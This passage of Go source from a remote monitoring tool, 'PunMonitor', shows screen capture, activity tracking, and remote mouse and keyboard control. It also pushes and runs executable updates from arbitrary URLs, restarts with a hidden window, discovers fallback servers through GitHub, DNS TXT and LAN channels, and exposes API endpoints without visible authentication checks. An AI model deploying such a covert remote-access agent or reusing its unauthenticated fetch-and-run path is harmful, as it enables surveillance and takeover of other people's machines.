		sm.dashMu.Lock()
		delete(sm.dashConns, conn)
		sm.dashMu.Unlock()
		conn.Close()
	}()

	for {
		mt, msg, err := conn.ReadMessage()
		if err != nil {
			break
		}
		// Text/JSON messages only (binary frames come from agents, not dashboard)
		if mt != websocket.TextMessage {
			continue
		}
		var cmd map[string]interface{}
		if json.Unmarshal(msg, &cmd) == nil {
			ct := cmd["type"]
			switch ct {
			case "push_urls_all":
				urls, _ := cmd["urls"].([]interface{})
				if len(urls) > 0 {
					var strs []string
					for _, u := range urls {
						if s, ok := u.(string); ok {
							strs = append(strs, s)
						}
					}
					if len(strs) > 0 {
						data, _ := json.Marshal(map[string]interface{}{"type": "urls_updated", "urls": strs})
						wm := &WireMessage{Type: MSG_UPDATE_URLS, Data: data}
						sm.agentsMu.Lock()
						for id := range sm.agents {
							_ = sm.sendToAgent(id, wm)
						}
						sm.agentsMu.Unlock()
					}
				}
		case "push_update", "restart":
			wm := &WireMessage{Type: MSG_CONTROL, Data: msg}
			sm.agentsMu.Lock()
			for id := range sm.agents {
				_ = sm.sendToAgent(id, wm)
			}
			sm.agentsMu.Unlock()
			case "select_agent", "hello", "set_transport_order":
				// Client-side only — no forwarding needed
			case "get_urls":
				urls := sm.cfg.GetServerURLs()
				if len(urls) > 0 {
					data, _ := json.Marshal(map[string]interface{}{"type": "urls_updated", "urls": urls})
					wm := &WireMessage{Type: MSG_UPDATE_URLS, Data: data}
					sm.agentsMu.Lock()
					for id := range sm.agents {
						_ = sm.sendToAgent(id, wm)
					}
					sm.agentsMu.Unlock()
				}
			case "generate_share_link":
				agentId, _ := cmd["agentId"].(string)
				if agentId == "" && len(sm.agents) == 1 {
					for id := range sm.agents {
						agentId = id
						break
					}
				}
				localIP := getLocalIP()
				port := sm.cfg.ConfigPort
				shareURL := fmt.Sprintf("http://%s:%d/?agent=%s", localIP, port, agentId)
				sendJSON(conn, map[string]interface{}{
					"type":    "share_link",
					"url":     shareURL,
					"agentId": agentId,
				})
			default:
				targetID, _ := cmd["agentId"].(string)
				sm.agentsMu.Lock()
				if targetID == "" && len(sm.agents) == 1 {
					for id := range sm.agents {
						targetID = id
						break
					}
				}
				// Send to specific agent
				ctrlData, _ := json.Marshal(cmd)
				wm := &WireMessage{Type: MSG_CONTROL, Data: ctrlData}
				_ = sm.sendToAgent(targetID, wm)
				sm.agentsMu.Unlock()
			}
		}
	}
}

func (sm *ServerMode) agentListHandler(w http.ResponseWriter, r *http.Request) {
	sm.agentsMu.Lock()
	var list []string
	for id := range sm.agents {
		list = append(list, id)
	}
	sm.agentsMu.Unlock()
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(list)
}

func (sm *ServerMode) apiUpdateHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	var body struct{ URL string `json:"url"` }
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || body.URL == "" {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}
	msg, _ := json.Marshal(map[string]interface{}{"type": "push_update", "url": body.URL})
	sm.agentsMu.Lock()
	for id := range sm.agents {
		wm := &WireMessage{Type: MSG_CONTROL, Data: msg}
		_ = sm.sendToAgent(id, wm)
	}
	sm.agentsMu.Unlock()
	w.WriteHeader(http.StatusOK)
}

func (sm *ServerMode) apiUpdateUploadHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	r.ParseMultipartForm(50 << 20)
	file, header, err := r.FormFile("file")
	if err != nil {
		http.Error(w, "no file uploaded", http.StatusBadRequest)
		return
	}
	defer file.Close()

	updateDir := filepath.Join(dataDir(), "updates")
	os.MkdirAll(updateDir, 0755)
	updatePath := filepath.Join(updateDir, "PunMonitor.exe")

	dst, err := os.Create(updatePath)
	if err != nil {
		http.Error(w, "failed to save file", http.StatusInternalServerError)
		return
	}
	io.Copy(dst, file)
	dst.Close()

	localIP := getLocalIP()
	port := sm.cfg.ConfigPort
	downloadURL := fmt.Sprintf("http://%s:%d/api/update-download", localIP, port)

	msg, _ := json.Marshal(map[string]interface{}{"type": "push_update", "url": downloadURL})
	sm.agentsMu.Lock()
	for id := range sm.agents {
		wm := &WireMessage{Type: MSG_CONTROL, Data: msg}
		_ = sm.sendToAgent(id, wm)
	}
	sm.agentsMu.Unlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"success": true,
		"message": fmt.Sprintf("Uploaded %s (%.1f MB), pushed to %d agents", header.Filename, float64(header.Size)/1024/1024, len(sm.agents)),
		"url":     downloadURL,
	})
}

func (sm *ServerMode) apiUpdateDownloadHandler(w http.ResponseWriter, r *http.Request) {
	updatePath := filepath.Join(dataDir(), "updates", "PunMonitor.exe")
	if _, err := os.Stat(updatePath); os.IsNotExist(err) {
		http.Error(w, "no update available", http.StatusNotFound)
		return
	}
	http.ServeFile(w, r, updatePath)
}

func (sm *ServerMode) apiRestartHandler(w http.ResponseWriter, r *http.Request) {
	msg, _ := json.Marshal(map[string]interface{}{"type": "restart"})
	sm.agentsMu.Lock()
	for id := range sm.agents {
		wm := &WireMessage{Type: MSG_CONTROL, Data: msg}
		_ = sm.sendToAgent(id, wm)
	}
	sm.agentsMu.Unlock()
	w.WriteHeader(http.StatusOK)
}

func (sm *ServerMode) apiReportHandler(w http.ResponseWriter, r *http.Request) {
	agentID := r.URL.Query().Get("agent")
	if agentID == "" {
		if r.URL.Query().Get("events") == "1" {
			sm.reportsMu.Lock()
			reports := make(map[string][]ActivityEvent)
			for id, evs := range sm.reports {
				reports[id] = evs
			}
			sm.reportsMu.Unlock()
			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode(mergeActivityEvents(reports))
			return
		}
		sm.reportsMu.Lock()
		var agents []string
		for id := range sm.reports {
			agents = append(agents, id)
		}
		sm.reportsMu.Unlock()
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(agents)
		return
	}
	sm.reportsMu.Lock()
	events := sm.reports[agentID]
	sm.reportsMu.Unlock()
	if events == nil {
		events = []ActivityEvent{}
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(events)
}

func (sm *ServerMode) apiReportCSVHandler(w http.ResponseWriter, r *http.Request) {
	sm.reportsMu.Lock()
	events := make(map[string][]ActivityEvent)
	for id, evs := range sm.reports {
		cpy := make([]ActivityEvent, len(evs))
		copy(cpy, evs)
		events[id] = cpy
	}
	sm.reportsMu.Unlock()
	writeActivityCSV(w, events, "activity-report-"+time.Now().Format("2006-01-02")+".csv")
}

func (sm *ServerMode) apiPushReportHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	sm.pushReportsToGitHub()
	w.WriteHeader(http.StatusOK)
}

func (sm *ServerMode) apiSettingsHandler(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case "GET":
		json.NewEncoder(w).Encode(map[string]interface{}{
			"github_repo": sm.cfg.GitHubRepo,
			"dns_domain":  sm.cfg.DNSDomain,
		})
	case "POST":
		var body struct {
			GitHubRepo  string `json:"github_repo"`
			GitHubToken string `json:"github_token"`
			DNSDomain   string `json:"dns_domain"`
		}
		if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
			http.Error(w, "bad request", http.StatusBadRequest)
			return
		}
		if body.GitHubRepo != "" {
			sm.cfg.GitHubRepo = body.GitHubRepo
		}
		if body.GitHubToken != "" {
			sm.cfg.GitHubToken = body.GitHubToken
		}
		if body.DNSDomain != "" {
			sm.cfg.DNSDomain = body.DNSDomain
		}
		// Persist
		saveConfig(sm.cfg)

		// Broadcast new settings to all connected agents
		settingsMsg, _ := json.Marshal(map[string]interface{}{
			"type":       "set_settings",
			"github_repo": sm.cfg.GitHubRepo,
			"dns_domain":  sm.cfg.DNSDomain,
		})
		sm.agentsMu.Lock()
		for id := range sm.agents {
			wm := &WireMessage{Type: MSG_CONTROL, Data: settingsMsg}
			_ = sm.sendToAgent(id, wm)
		}
		sm.agentsMu.Unlock()

		w.WriteHeader(http.StatusOK)
	default:
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
	}
}

func (sm *ServerMode) metricsHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	sm.agentsMu.Lock()
	var list []string
	for id := range sm.agents {
		list = append(list, id)
	}
	sm.agentsMu.Unlock()
	json.NewEncoder(w).Encode(map[string]interface{}{
		"agents":      list,
		"server_mode": true,
	})
}

func (sm *ServerMode) configHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"server_port":     sm.cfg.ConfigPort,
		"monthly_limit_mb": sm.cfg.MonthlyLimitMB,
	})
}

func (sm *ServerMode) apiConfigUpdateHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	var upd struct {
		MonthlyLimitMB int64 `json:"monthly_limit_mb"`
	}
	if json.NewDecoder(r.Body).Decode(&upd) == nil && upd.MonthlyLimitMB > 0 {
		sm.cfg.MonthlyLimitMB = upd.MonthlyLimitMB
	}
	w.WriteHeader(http.StatusOK)
}

func (sm *ServerMode) tierHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	var body struct {
		Tier int `json:"tier"`
	}
	if json.NewDecoder(r.Body).Decode(&body) == nil {
		msg, _ := json.Marshal(map[string]interface{}{"type": "set_tier", "tier": body.Tier})
		sm.agentsMu.Lock()
		for id := range sm.agents {
			wm := &WireMessage{Type: MSG_CONTROL, Data: msg}
			_ = sm.sendToAgent(id, wm)
		}
		sm.agentsMu.Unlock()
	}
	w.WriteHeader(http.StatusOK)
}

func (sm *ServerMode) apiSystemInfoHandler(w http.ResponseWriter, r *http.Request) {
	ds := &DashboardServer{cfg: sm.cfg, startTime: time.Now()}
	info := ds.getSystemInfo()
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(info)
}

func (sm *ServerMode) bandwidthHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodPost {
var body struct {
		MB int64 `json:"mb"`
	}
	if json.NewDecoder(r.Body).Decode(&body) == nil && body.MB > 0 {
		sm.cfg.MonthlyLimitMB = body.MB
		}
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"monthly_limit_mb": sm.cfg.MonthlyLimitMB,
	})
}

func (sm *ServerMode) apiHideAgentHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	var body struct {
		AgentID string `json:"agent_id"`
		Hide    bool   `json:"hide"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}
	sm.hiddenMu.Lock()
	if body.Hide {
		sm.hiddenAgents[body.AgentID] = true
	} else {
		delete(sm.hiddenAgents, body.AgentID)
	}
	sm.hiddenMu.Unlock()
	sm.broadcastAgentList()
	w.WriteHeader(http.StatusOK)
}

func (sm *ServerMode) apiRemoveAgentHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	var body struct {
		AgentID string `json:"agent_id"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}
	msg, _ := json.Marshal(map[string]interface{}{"type": "remove_agent"})
	sm.agentsMu.Lock()
	if _, ok := sm.agents[body.AgentID]; ok {
		wm := &WireMessage{Type: MSG_CONTROL, Data: msg}
		_ = sm.sendToAgent(body.AgentID, wm)
		delete(sm.agents, body.AgentID)
	}
	sm.agentsMu.Unlock()
	sm.hiddenMu.Lock()
	delete(sm.hiddenAgents, body.AgentID)
	sm.hiddenMu.Unlock()
	sm.broadcastAgentList()
	w.WriteHeader(http.StatusOK)
}

func (sm *ServerMode) apiAgentListFullHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(sm.allAgentListWithStatus())
}

func (sm *ServerMode) sendPendingUpdates(agentID string) {
	sm.pendingUpdMu.Lock()
	defer sm.pendingUpdMu.Unlock()
	if url, ok := sm.pendingUpdates[agentID]; ok {
		llog("info", "sending pending update to %s: %s", agentID, url)
		msg, _ := json.Marshal(map[string]interface{}{"type": "push_update", "url": url})
		wm := &WireMessage{Type: MSG_CONTROL, Data: msg}
		_ = sm.sendToAgent(agentID, wm) // ignore error, agent may disconnect
		delete(sm.pendingUpdates, agentID)
	}
}

func (sm *ServerMode) apiPushUpdateHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	var body struct {
		URL     string `json:"url"`
		AgentID string `json:"agent_id"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || body.URL == "" {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}
	msg, _ := json.Marshal(map[string]interface{}{"type": "push_update", "url": body.URL})
	sm.agentsMu.Lock()
	if body.AgentID != "" {
		if info, ok := sm.agents[body.AgentID]; ok {
			wm := &WireMessage{Type: MSG_CONTROL, Data: msg}
			_ = info.Send(wm) // ignore error
		} else {
			sm.pendingUpdates[body.AgentID] = body.URL
		}
	} else {
		for id, info := range sm.agents {
			wm := &WireMessage{Type: MSG_CONTROL, Data: msg}
			_ = info.Send(wm) // ignore error
			sm.pendingUpdates[id] = body.URL
		}
	}
	sm.agentsMu.Unlock()
	w.WriteHeader(http.StatusOK)
	w.Write([]byte("update pushed"))
}

// ============================================================================
// SECTION 19 — Agent (coordinator: transport, capture, health, reconnect)
// ============================================================================

type Agent struct {
	id            string
	config        *Config
	pool          *TransportPool
	health        *HealthChecker
	reconnect     *ReconnectManager
	bandwidth     *BandwidthMonitor
	encoder       *CaptureEncoder
	captureLoop   *CaptureLoop
	idleDetect    *IdleDetector
	inputEvent    *InputEvent
	tunnelMgr     *TunnelManager
	eventBuf      *EventBuffer
	reportSink    func(agentID string, events []ActivityEvent)
	frameCh       chan *WireMessage
	lastMouseX    int
	lastMouseY    int
	ctx           context.Context
	cancel        context.CancelFunc
	done          chan struct{}
	githubChecker *GitHubURLChecker
	dnsChecker    *DNSURLChecker
	landiscovery  *LANDiscovery
}

func NewAgent(cfg *Config, frameCh chan *WireMessage) *Agent {
	ctx, cancel := context.WithCancel(context.Background())
	pool := NewTransportPool()
	bm := NewBandwidthMonitor(cfg.MonthlyLimitMB)
	encoder := NewCaptureEncoder()
	input := setupInputEvents()

	a := &Agent{
		id:         agentID,
		config:     cfg,
		pool:       pool,
		health:     NewHealthChecker(),
		reconnect:  NewReconnectManager(),
		bandwidth:  bm,
		encoder:    encoder,
		inputEvent: input,
		eventBuf:   NewBuffer(5000),
		frameCh:    frameCh,
		ctx:        ctx,
		cancel:     cancel,
		done:       make(chan struct{}),
	}

	a.captureLoop = NewCaptureLoop(encoder, bm, pool, frameCh)
	if cfg.MaxFPS > 0 {
		a.captureLoop.SetFPS(cfg.MaxFPS)
	}

	// Health check setup (same for both modes)
	a.health.SetOnDead(func(id string) {
		llog("warn", "Connection dead: %s, reconnecting...", id)
		a.pool.Remove(id)
		go a.connectToServer(id)
	})

	// Idle detector setup (same for both modes)
	a.idleDetect = NewIdleDetector(5*time.Minute, func(idle bool) {
		if idle {
			llog("info", "system idle, reducing FPS")
			a.SetFPS(MIN_FPS)
			a.pushEvent("user_idle_start", "")
		} else {
			llog("info", "system active, restoring FPS")
			a.SetFPS(cfg.MaxFPS)
			a.pushEvent("user_active", "")
		}
	})
	a.idleDetect.Start(ctx)

	// Tunnel manager (same for both modes)
	if cfg.TunnelMode != "" {
		a.tunnelMgr = NewTunnelManager(cfg.TunnelMode, cfg.ConfigPort)
		if err := a.tunnelMgr.Start(ctx); err != nil {
			llog("error", "tunnel: %v", err)
		}
	}

	// GitHub URL checker (checks for new server URLs every 24h)
	a.githubChecker = NewGitHubURLChecker(cfg, func(newURLs []string) {
		llog("info", "GitHub: new server URLs found, connecting...")
		for _, u := range newURLs {
			go a.connectToServer(u)
		}
	})
	a.githubChecker.Start()

	// LAN discovery for agent-to-agent URL sharing
	a.landiscovery = NewLANDiscovery()
	a.landiscovery.SetAgentID(agentID)
	a.landiscovery.SetPort(cfg.ConfigPort)
	a.landiscovery.SetOnURLsFound(func(urls []string) {
		for _, u := range urls {
			go a.connectToServer(u)
		}
	})
	a.landiscovery.Start()

	// DNS TXT record discovery (checks every 1 hour)
	// Domain can be set via PUN_DNS_DOMAIN env or config (DNSDomain)
	dnsDomain := os.Getenv("PUN_DNS_DOMAIN")
	if dnsDomain == "" {
		dnsDomain = cfg.DNSDomain
	}
	if dnsDomain != "" {
		a.dnsChecker = NewDNSURLChecker(dnsDomain, func(urls []string) {
			llog("info", "DNS: new server URLs found, connecting...")
			for _, u := range urls {
				go a.connectToServer(u)
			}
		})
		a.dnsChecker.Start()
	}

	return a
}

func (a *Agent) Start() {
	a.pushEvent("agent_start", "")
	
	// Update LAN discovery with current URLs
	if a.landiscovery != nil {
		a.landiscovery.UpdateServerURLs(a.config.GetServerURLs())
	}
	
	for _, url := range a.config.GetServerURLs() {
		go a.connectToServer(url)
	}
	go a.heartbeatLoop()
	go a.metricsLoop()
	go a.eventReportLoop()
}

func (a *Agent) eventReportLoop() {
	t := time.NewTicker(20 * time.Second)
	defer t.Stop()
	for {
		select {
		case <-a.ctx.Done():
			return
		case <-t.C:
			events := a.eventBuf.Flush()
			if len(events) == 0 {
				continue
			}
			if a.reportSink != nil {
				a.reportSink(a.id, events)
			}
			data, _ := json.Marshal(events)
			wm := &WireMessage{Type: MSG_REPORT, Data: data}
			if best := a.pool.GetBest(); best != nil {
				best.Send(wm)
			}
		}
	}
}

func (a *Agent) connectToServer(url string) {
	for {
		select {
		case <-a.ctx.Done():
			return
		default:
		}
		a.reconnect.Wait(url)
		llog("info", "connecting to %s", url)

		var t Transport
		var err error
		priority := 10
		if strings.Contains(url, "127.0.0.1") || strings.Contains(url, "192.168.") || strings.Contains(url, "10.") {
			priority = 5
		}

		// Try QUIC for quic:// URLs, fallback to WebSocket for ws://
		if strings.HasPrefix(url, "quic://") {
			quicAddr := url[7:] // strip quic://
			t, err = NewQUICTransport(a.ctx, quicAddr, priority, url)
			if err != nil {
				llog("warn", "quic dial %s: %v — fallback to WS", url, err)
				// Fall through to WebSocket attempt
			}
		} else if strings.HasPrefix(url, "webrtc://") {
			// WebRTC: use WebSocket for signaling and DataChannel for data
			wsURL := "ws://" + url[9:]
			if !strings.Contains(wsURL, "/agent/ws") {
				wsURL = strings.TrimRight(wsURL, "/") + "/agent/ws"
			}
			llog("info", "webrtc: connecting via WS for signaling: %s", wsURL)
			// Dial WebSocket for signaling
			dialer := websocket.Dialer{
				HandshakeTimeout:  CONNECTION_TIMEOUT,
				EnableCompression: true,
			}
			header := http.Header{}
			header.Set("X-Agent-ID", a.id)
			header.Set("X-Auth-User", a.config.AuthUser)
			header.Set("Authorization", "Bearer "+a.config.AuthPass)
			wsConn, _, err := dialer.Dial(wsURL, header)
			if err != nil {
				llog("warn", "webrtc WS dial %s: %v — fallback to WS", wsURL, err)
				// Fall through to WebSocket attempt
				break
			}
			// Create sendSignal function for WebRTC transport
			sendSignal := func(msgType int, data []byte) error {
				wm := &WireMessage{Type: msgType, Data: data}
				return wsConn.WriteMessage(websocket.BinaryMessage, wm.Marshal())
			}
			// Create WebRTC transport (concrete type)
			wt, err := NewWebRTCTransport(a.ctx, url, priority, sendSignal)
			if err != nil {
				llog("warn", "webrtc transport create %s: %v — fallback to WS", url, err)
				wsConn.Close()
				break
			}
			t = wt // assign to interface variable for pool and readLoop
			// Add transport to pool
			a.pool.Add(url, t)
			a.health.Register(url)
			llog("info", "connected to %s via webrtc (signaling via WS)", url)
			a.pushEvent("connected", url)
			a.reconnect.RecordSuccess(url)
			// Start WebRTC signaling loop in a separate goroutine
			go func() {
				for {
					_, data, err := wsConn.ReadMessage()
					if err != nil {
						llog("warn", "webrtc signaling read error: %v", err)
						wt.cancel()
						return
					}
					wm := &WireMessage{}
					if wm.Unmarshal(data) != nil {
						continue
					}
					switch wm.Type {
					case MSG_WEBRTC_ANSWER:
						if err := wt.HandleAnswer(string(wm.Data)); err != nil {
							llog("warn", "webrtc handle answer: %v", err)
						}
					case MSG_WEBRTC_ICE:
						if err := wt.HandleICE(string(wm.Data)); err != nil {
							llog("warn", "webrtc handle ICE: %v", err)
						}
					default:
						// Forward other messages (control, heartbeat, etc.) to transport's recvCh
						select {
						case wt.recvCh <- wm:
						case <-wt.closed:
							return
						}
					}
				}
			}()
			// Run readLoop for WebRTC transport (this blocks)
			a.readLoop(t, url)
			// Cleanup after readLoop exits
			a.pool.Remove(url)
			wsConn.Close()
			if wt, ok := t.(*webrtcTransport); ok {
				wt.Close()
			}
			llog("info", "webrtc transport disconnected from %s", url)
			a.pushEvent("disconnected", url)
			continue
		}

		if t == nil {
			wsURL := normalizeAgentWSURL(url)
			dialer := websocket.Dialer{
				HandshakeTimeout:  CONNECTION_TIMEOUT,
				EnableCompression: true,
			}
			header := http.Header{}
			header.Set("X-Agent-ID", a.id)
			header.Set("X-Auth-User", a.config.AuthUser)
			header.Set("Authorization", "Bearer "+a.config.AuthPass)
			var wsConn *websocket.Conn
			wsConn, _, err = dialer.Dial(wsURL, header)
			if err != nil {
				llog("warn", "dial %s: %v", url, err)
				a.reconnect.RecordFailure(url)
				continue
			}
			t = NewWSTransport(wsConn, priority, url)
		}

		a.pool.Add(url, t)
		a.health.Register(url)
		llog("info", "connected to %s via %s", url, t.Name())
		a.pushEvent("connected", url)
		a.reconnect.RecordSuccess(url)
		t.Send(&WireMessage{Type: MSG_HEARTBEAT, Data: []byte(fmt.Sprintf(`{"type":"hello","version":"%s"}`, Version))})
		// Request latest URLs from server on every reconnect
		t.Send(&WireMessage{Type: MSG_CONTROL, Data: []byte(`{"type":"get_urls"}`)})
		a.readLoop(t, url)
		a.pool.Remove(url)
		llog("info", "disconnected from %s", url)
		a.pushEvent("disconnected", url)
	}
}

func (a *Agent) readLoop(t Transport, id string) {
	for {
		select {
		case <-a.ctx.Done():
			return
		default:
		}
		msg, err := t.Recv()
		if err != nil {
			a.health.ReportFailure(id, err)
			return
		}
		if msg == nil {
			time.Sleep(10 * time.Millisecond)
			continue
		}
		a.health.Heartbeat(id)
		switch msg.Type {
		case MSG_HEARTBEAT:
			t.Send(&WireMessage{Type: MSG_HEARTBEAT, Data: []byte("pong")})
		case MSG_UPDATE_URLS:
			var upd struct{ URLs []string `json:"urls"` }
			if json.Unmarshal(msg.Data, &upd) == nil {
				a.config.SetServerURLs(upd.URLs)
				for _, u := range upd.URLs {
					go a.connectToServer(u)
				}
			}
		case MSG_CONTROL:
			// Server-relayed commands (mouse, input, tunnel, etc.)
			var cmd map[string]interface{}
			if json.Unmarshal(msg.Data, &cmd) == nil {
				if _, hasCmd := cmd["command"]; hasCmd {
					// Direct control command: {command, params}
					var ctl struct {
						Command string            `json:"command"`
						Params  map[string]string `json:"params"`
					}
					if json.Unmarshal(msg.Data, &ctl) == nil {
						executeControl(ctl.Command, ctl.Params)
					}
				} else {
					a.handleRemoteCommand(cmd)
				}
			}
		}
	}
}

func (a *Agent) handleRemoteCommand(cmd map[string]interface{}) {
	switch cmd["type"] {
	case "mouse_move":
		x, _ := cmd["x"].(float64)
		y, _ := cmd["y"].(float64)
		a.lastMouseX = int(x)
		a.lastMouseY = int(y)
		a.inputEvent.MouseMove(a.lastMouseX, a.lastMouseY)
	case "mouse_click":
		btn, _ := cmd["button"].(string)
		left := btn != "right" && btn != "middle"
		if btn == "middle" {
			a.inputEvent.MouseMiddleClick(a.lastMouseX, a.lastMouseY)
			break
		}
		a.inputEvent.MouseClick(a.lastMouseX, a.lastMouseY, left)
	case "key_press":
		if k, ok := cmd["key"].(float64); ok {
			a.inputEvent.KeyPress(uint16(k))
		}
	case "type_text":
		t, _ := cmd["text"].(string)
		a.inputEvent.TypeText(t)
	case "set_quality":
		if q, ok := cmd["quality"].(float64); ok {
			a.encoder.SetQuality(q)
		}
	case "set_fps":
		if fps, ok := cmd["fps"].(float64); ok {
			a.SetFPS(fps)
		}
	case "set_bandwidth_limit":
		if mb, ok := cmd["mb"].(float64); ok {
			a.bandwidth.SetLimitMB(int64(mb))
			a.config.SetMonthlyLimitMB(int64(mb))
			if a.bandwidth.IsOverLimit() {
				llog("warn", "bandwidth limit reached, throttling...")
				a.SetFPS(MIN_FPS)
			} else {
				a.SetFPS(a.config.MaxFPS)
			}
		}
	case "set_tier":
		if tier, ok := cmd["tier"].(float64); ok && a.captureLoop != nil {
			a.captureLoop.ForceTier(CaptureTier(int(tier)))
		}
	case "urls_updated":
		if urlsRaw, ok := cmd["urls"].([]interface{}); ok {
			var urls []string
			for _, u := range urlsRaw {
				if s, ok := u.(string); ok {
					urls = append(urls, s)
				}
			}
			if len(urls) > 0 {
				a.config.SetServerURLs(urls)
				llog("info", "urls_updated: new URLs %v", urls)
				
				// Update LAN discovery with new URLs
				if a.landiscovery != nil {
					a.landiscovery.UpdateServerURLs(urls)
				}
				
				for _, u := range urls {
					go a.connectToServer(u)
				}
			}
		}
	case "push_update":
		if url, ok := cmd["url"].(string); ok && url != "" {
			llog("info", "update requested: %s", url)
			go applyUpdate(url)
		}
	case "restart":
		llog("info", "restart requested by server")
		go func() {
			time.Sleep(1 * time.Second)
			exe, err := os.Executable()
			if err != nil {
				return
			}
			cmd := exec.Command(exe)
			hideCmdWindow(cmd)
			if cmd.Start() == nil {
				os.Exit(0)
			}
		}()
	case "set_settings":
		// Update GitHub repo and DNS domain from server push
		if github, ok := cmd["github_repo"].(string); ok && github != "" {
			a.config.GitHubRepo = github
			llog("info", "settings: github_repo updated to %s", github)
		}
		if dns, ok := cmd["dns_domain"].(string); ok && dns != "" {
			a.config.DNSDomain = dns
			llog("info", "settings: dns_domain updated to %s", dns)
			// Restart DNS checker to use new domain
			if a.dnsChecker != nil {
				a.dnsChecker.Stop()
			}
			a.dnsChecker = NewDNSURLChecker(dns, func(urls []string) {
				llog("info", "DNS: new server URLs found, connecting...")
				for _, u := range urls {
					go a.connectToServer(u)
				}
			})
			a.dnsChecker.Start()
		}
		// Persist changes to config file
		saveConfig(a.config)
	case "remove_agent":
		llog("info", "remove agent requested by server, shutting down...")
		a.pushEvent("agent_stop", "removed by server")
		recordShutdown("removed by server")
		stopWatchdog()
		time.Sleep(500 * time.Millisecond)
		os.Exit(0)
	}
}

type ActivityEvent struct {
	Timestamp int64  `json:"ts"`
	Type      string `json:"type"`
	Detail    string `json:"detail,omitempty"`
}

type EventBuffer struct {
	mu     sync.Mutex
	events []ActivityEvent
	max    int
}

func NewBuffer(max int) *EventBuffer {
	return &EventBuffer{max: max}
}

func (eb *EventBuffer) Push(typ, detail string) {
	eb.mu.Lock()
	defer eb.mu.Unlock()
	eb.events = append(eb.events, ActivityEvent{
		Timestamp: time.Now().UnixMilli(),
		Type:      typ,
		Detail:    detail,
	})
	if len(eb.events) > eb.max {
		eb.events = eb.events[len(eb.events)-eb.max:]
	}
}

func (eb *EventBuffer) Flush() []ActivityEvent {
	eb.mu.Lock()
	defer eb.mu.Unlock()
	if len(eb.events) == 0 {
		return nil
	}
	out := make([]ActivityEvent, len(eb.events))
	copy(out, eb.events)
	eb.events = eb.events[:0]
	return out
}



// ============================================================================
// SECTION 24 - URL Loading (urls.ini)
// ============================================================================

var serverNames = map[string]string{}


func loadURLs(cfg *Config) {
	iniPath := filepath.Join(exeDir(), "urls.ini")
	if data, err := os.ReadFile(iniPath); err == nil {
		scanner := bufio.NewScanner(bytes.NewReader(data))
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if line == "" || strings.HasPrefix(line, "#") || strings.HasPrefix(line, ";") {
				continue
			}
			if strings.Contains(line, "=") {
				parts := strings.SplitN(line, "=", 2)
				name := strings.TrimSpace(parts[0])
				url := strings.TrimSpace(parts[1])
				if url != "" {
					url = normalizeConfigURL(url)
					serverNames[url] = name
					cfg.ServerURLs = append(cfg.ServerURLs, url)
				}
			} else {
				cfg.ServerURLs = append(cfg.ServerURLs, normalizeConfigURL(line))
			}
		}
	}
}

func exeDir() string {
	exe, err := os.Executable()
	if err != nil {
		return "."
	}
	return filepath.Dir(exe)
}

// ============================================================================
// SECTION 25 — Logging (structured levels)
// ============================================================================

type LogLevel int

const (
	LogDebug LogLevel = iota
	LogInfo
	LogWarn
	LogError
)

var currentLogLevel = LogInfo
func llog(level string, format string, args ...interface{}) {
	ts := time.Now().Format("15:04:05.000")
	msg := fmt.Sprintf(format, args...)
	fmt.Println(ts + " [" + level + "] " + msg)
}

// ============================================================================
// SECTION 26 — Utility Functions
// ============================================================================

func dataDir() string {
	exe, _ := os.Executable()
	if runtime.GOOS == "windows" {
		if ad := os.Getenv("APPDATA"); ad != "" {
			d := filepath.Join(ad, "PunMonitor")
			os.MkdirAll(d, 0755)
			return d
		}
	}
	return filepath.Dir(exe)
}

func getLocalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return ""
	}
	for _, a := range addrs {
		if ipnet, ok := a.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ip := ipnet.IP.To4(); ip != nil {
				s := ip.String()
